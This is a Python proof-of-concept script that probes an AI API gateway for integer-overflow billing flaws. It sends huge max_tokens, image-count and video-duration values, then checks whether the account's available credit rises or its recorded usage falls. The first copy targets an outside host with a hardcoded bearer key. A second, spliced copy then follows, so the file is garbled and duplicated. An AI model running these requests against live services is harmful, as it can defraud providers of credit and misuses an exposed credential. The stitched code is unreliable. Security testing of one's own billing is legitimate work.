#!/usr/bin/env python3
import json
import os
import sys
import urllib.error
import urllib.request

#!/usr/bin/env python3
import json
import os
import sys
import urllib.error
import urllib.request

BASE_URL = os.environ.get("BASE_URL", "https://airgate.k8ray.com/v1").rstrip("/")
NEWAPI_KEY = "sk-3ac94688014ac614a9de20d983ba3f0068e52d947f3845c1429d06e2b89e0e3c"

CHAT_MODEL = "claude-opus-4-8"
IMAGE_MODEL = os.environ.get("IMAGE_MODEL")
VIDEO_MODEL = os.environ.get("VIDEO_MODEL")

HUGE = "18446744073686646784"

if not NEWAPI_KEY:
    print("missing env: NEWAPI_KEY")
    sys.exit(2)

if not CHAT_MODEL and not IMAGE_MODEL and not VIDEO_MODEL:
    print("set at least one of CHAT_MODEL / IMAGE_MODEL / VIDEO_MODEL")
    sys.exit(2)


def http(method, path, body=None):
    headers = {"Authorization": f"Bearer {NEWAPI_KEY}"}
    data = None
    if body is not None:
        headers["Content-Type"] = "application/json"
        data = body.encode("utf-8")

    req = urllib.request.Request(
        BASE_URL + path,
        data=data,
        headers=headers,
        method=method,
    )

    try:
        with urllib.request.urlopen(req, timeout=45) as resp:
            return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:
        return -1, repr(e)


def usage():
    status, text = http("GET", "/api/usage/token")
    if status != 200:
        raise RuntimeError(f"usage query failed: HTTP {status}: {text[:500]}")
    obj = json.loads(text)
    data = obj.get("data") or {}
    return {
        "total_used": data.get("total_used"),
        "total_available": data.get("total_available"),
        "total_granted": data.get("total_granted"),
        "unlimited_quota": data.get("unlimited_quota"),
        "raw": data,
    }


def to_int(x):
    try:
        return int(x)
    except Exception:
        return None


def classify(before, after, status, text):
    bu = to_int(before.get("total_used"))
    au = to_int(after.get("total_used"))
    ba = to_int(before.get("total_available"))
    aa = to_int(after.get("total_available"))

    used_delta = None if bu is None or au is None else au - bu
    avail_delta = None if ba is None or aa is None else aa - ba

    lower = text.lower()

    if before.get("unlimited_quota") or after.get("unlimited_quota"):
        return "INCONCLUSIVE_UNLIMITED_TOKEN", used_delta, avail_delta

    if avail_delta is not None and avail_delta > 0:
        return "VULNERABLE_CREDIT_AVAILABLE_INCREASED", used_delta, avail_delta

    if used_delta is not None and used_delta < 0:
        return "VULNERABLE_CREDIT_USED_DECREASED", used_delta, avail_delta

    if (used_delta not in (None, 0)) or (avail_delta not in (None, 0)):
        return "BILLING_SIDE_EFFECT_ON_MALFORMED_REQUEST", used_delta, avail_delta

    if (
        "no available channel" in lower
        or "model not found" in lower
        or "无可用渠道" in lower
    ):
        return "INCONCLUSIVE_NO_CHANNEL_OR_MODEL", used_delta, avail_delta

    if 400 <= status < 500:
        return "REJECTED_NO_BALANCE_CHANGE", used_delta, avail_delta

    if status >= 500 or status == -1:
        return "SERVER_ERROR_NO_BALANCE_CHANGE", used_delta, avail_delta

    if 200 <= status < 300:
        return "SUCCESS_NO_BALANCE_CHANGE_SUSPICIOUS", used_delta, avail_delta

    return "UNKNOWN_NO_BALANCE_CHANGE", used_delta, avail_delta


cases = []

if CHAT_MODEL:
    cases.extend(
        [
            {
                "name": "chat max_tokens overflow",
                "path": "/v1/chat/completions",
                "body": {
                    "model": CHAT_MODEL,
                    "messages": [{"role": "user", "content": "hi"}],
                    "max_tokens": int(HUGE),
                },
            },
            {
                "name": "chat max_completion_tokens overflow",
                "path": "/v1/chat/completions",
                "body": {
                    "model": CHAT_MODEL,
                    "messages": [{"role": "user", "content": "hi"}],
                    "max_completion_tokens": int(HUGE),
                },
            },
            {
                "name": "responses max_output_tokens overflow",
                "path": "/v1/responses",
                "body": {
                    "model": CHAT_MODEL,
                    "input": "hi",
                    "max_output_tokens": int(HUGE),
                },
            },
        ]
    )

if IMAGE_MODEL:
    cases.append(
        {
            "name": "image n overflow",
            "path": "/v1/images/generations",
            "body": {
                "model": IMAGE_MODEL,
                "prompt": "poc",
                "n": int(HUGE),
            },
        }
    )

if VIDEO_MODEL:
    cases.extend(
        [
            {
                "name": "video duration overflow",
                "path": "/v1/video/generations",
                "body": {
                    "model": VIDEO_MODEL,
                    "prompt": "poc",
                    "duration": 9999999999,
                },
            },
            {
                "name": "video seconds overflow",
                "path": "/v1/video/generations",
                "body": {
                    "model": VIDEO_MODEL,
                    "prompt": "poc",
                    "seconds": "9999999999",
                },
            },
        ]
    )

print("[BASE_URL]", BASE_URL)
print("[CASES]", len(cases))

bad = False
inconclusive = False

for case in cases:
    before = usage()
    status, text = http("POST", case["path"], json.dumps(case["body"]))
    after = usage()

    verdict, used_delta, avail_delta = classify(before, after, status, text)

    print("\n==", case["name"], "==")
    print("HTTP:", status)
    print("VERDICT:", verdict)
    print("used_delta:", used_delta, "available_delta:", avail_delta)
    print("body:", text[:600].replace("\n", " "))

    if verdict.startswith("VULNERABLE") or verdict.startswith("BILLING_SIDE_EFFECT"):
        bad = True
    if verdict.startswith("INCONCLUSIVE"):
        inconclusive = True

print("\nSUMMARY:")
if bad:
    print("VULNERABLE_OR_BILLING_SIDE_EFFECT_CONFIRMED")
    sys.exit(1)
elif inconclusive:
    print("NO_BALANCE_CHANGE_BUT_SOME_PATHS_INCONCLUSIVE")
    sys.exit(2)
else:
    print("NO_BALANCE_IMPACT_OBSERVED")
    sys.exit(0)
BASE_URL = os.environ.get("BASE_URL", "http://127.0.0.1:3000").rstrip("/")
NEWAPI_KEY = os.environ.get("NEWAPI_KEY")

CHAT_MODEL = os.environ.get("CHAT_MODEL")
IMAGE_MODEL = os.environ.get("IMAGE_MODEL")
VIDEO_MODEL = os.environ.get("VIDEO_MODEL")

HUGE = "18446744073686646784"

if not NEWAPI_KEY:
    print("missing env: NEWAPI_KEY")
    sys.exit(2)

if not CHAT_MODEL and not IMAGE_MODEL and not VIDEO_MODEL:
    print("set at least one of CHAT_MODEL / IMAGE_MODEL / VIDEO_MODEL")
    sys.exit(2)


def http(method, path, body=None):
    headers = {"Authorization": f"Bearer {NEWAPI_KEY}"}
    data = None
    if body is not None:
        headers["Content-Type"] = "application/json"
        data = body.encode("utf-8")

    req = urllib.request.Request(
        BASE_URL + path,
        data=data,
        headers=headers,
        method=method,
    )

    try:
        with urllib.request.urlopen(req, timeout=45) as resp:
            return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:
        return -1, repr(e)


def usage():
    status, text = http("GET", "/api/usage/token")
    if status != 200:
        raise RuntimeError(f"usage query failed: HTTP {status}: {text[:500]}")
    obj = json.loads(text)
    data = obj.get("data") or {}
    return {
        "total_used": data.get("total_used"),
        "total_available": data.get("total_available"),
        "total_granted": data.get("total_granted"),
        "unlimited_quota": data.get("unlimited_quota"),
        "raw": data,
    }


def to_int(x):
    try:
        return int(x)
    except Exception:
        return None


def classify(before, after, status, text):
    bu = to_int(before.get("total_used"))
    au = to_int(after.get("total_used"))
    ba = to_int(before.get("total_available"))
    aa = to_int(after.get("total_available"))

    used_delta = None if bu is None or au is None else au - bu
    avail_delta = None if ba is None or aa is None else aa - ba

    lower = text.lower()

    if before.get("unlimited_quota") or after.get("unlimited_quota"):
        return "INCONCLUSIVE_UNLIMITED_TOKEN", used_delta, avail_delta

    if avail_delta is not None and avail_delta > 0:
        return "VULNERABLE_CREDIT_AVAILABLE_INCREASED", used_delta, avail_delta

    if used_delta is not None and used_delta < 0:
        return "VULNERABLE_CREDIT_USED_DECREASED", used_delta, avail_delta

    if (used_delta not in (None, 0)) or (avail_delta not in (None, 0)):
        return "BILLING_SIDE_EFFECT_ON_MALFORMED_REQUEST", used_delta, avail_delta

    if (
        "no available channel" in lower
        or "model not found" in lower
        or "无可用渠道" in lower
    ):
        return "INCONCLUSIVE_NO_CHANNEL_OR_MODEL", used_delta, avail_delta

    if 400 <= status < 500:
        return "REJECTED_NO_BALANCE_CHANGE", used_delta, avail_delta

    if status >= 500 or status == -1:
        return "SERVER_ERROR_NO_BALANCE_CHANGE", used_delta, avail_delta

    if 200 <= status < 300:
        return "SUCCESS_NO_BALANCE_CHANGE_SUSPICIOUS", used_delta, avail_delta

    return "UNKNOWN_NO_BALANCE_CHANGE", used_delta, avail_delta


cases = []

if CHAT_MODEL:
    cases.extend(
        [
            {
                "name": "chat max_tokens overflow",
                "path": "/v1/chat/completions",
                "body": {
                    "model": CHAT_MODEL,
                    "messages": [{"role": "user", "content": "hi"}],
                    "max_tokens": int(HUGE),
                },
            },
            {
                "name": "chat max_completion_tokens overflow",
                "path": "/v1/chat/completions",
                "body": {
                    "model": CHAT_MODEL,
                    "messages": [{"role": "user", "content": "hi"}],
                    "max_completion_tokens": int(HUGE),
                },
            },
            {
                "name": "responses max_output_tokens overflow",
                "path": "/v1/responses",
                "body": {
                    "model": CHAT_MODEL,
                    "input": "hi",
                    "max_output_tokens": int(HUGE),
                },
            },
        ]
    )

if IMAGE_MODEL:
    cases.append(
        {
            "name": "image n overflow",
            "path": "/v1/images/generations",
            "body": {
                "model": IMAGE_MODEL,
                "prompt": "poc",
                "n": int(HUGE),
            },
        }
    )

if VIDEO_MODEL:
    cases.extend(
        [
            {
                "name": "video duration overflow",
                "path": "/v1/video/generations",
                "body": {
                    "model": VIDEO_MODEL,
                    "prompt": "poc",
                    "duration": 9999999999,
                },
            },
            {
                "name": "video seconds overflow",
                "path": "/v1/video/generations",
                "body": {
                    "model": VIDEO_MODEL,
                    "prompt": "poc",
                    "seconds": "9999999999",
                },
            },
        ]
    )

print("[BASE_URL]", BASE_URL)
print("[CASES]", len(cases))

bad = False
inconclusive = False

for case in cases:
    before = usage()
    status, text = http("POST", case["path"], json.dumps(case["body"]))
    after = usage()

    verdict, used_delta, avail_delta = classify(before, after, status, text)

    print("\n==", case["name"], "==")
    print("HTTP:", status)
    print("VERDICT:", verdict)
    print("used_delta:", used_delta, "available_delta:", avail_delta)
    print("body:", text[:600].replace("\n", " "))

    if verdict.startswith("VULNERABLE") or verdict.startswith("BILLING_SIDE_EFFECT"):
        bad = True
    if verdict.startswith("INCONCLUSIVE"):
        inconclusive = True

print("\nSUMMARY:")
if bad:
    print("VULNERABLE_OR_BILLING_SIDE_EFFECT_CONFIRMED")
    sys.exit(1)
elif inconclusive:
    print("NO_BALANCE_CHANGE_BUT_SOME_PATHS_INCONCLUSIVE")
    sys.exit(2)
else:
    print("NO_BALANCE_IMPACT_OBSERVED")
    sys.exit(0)
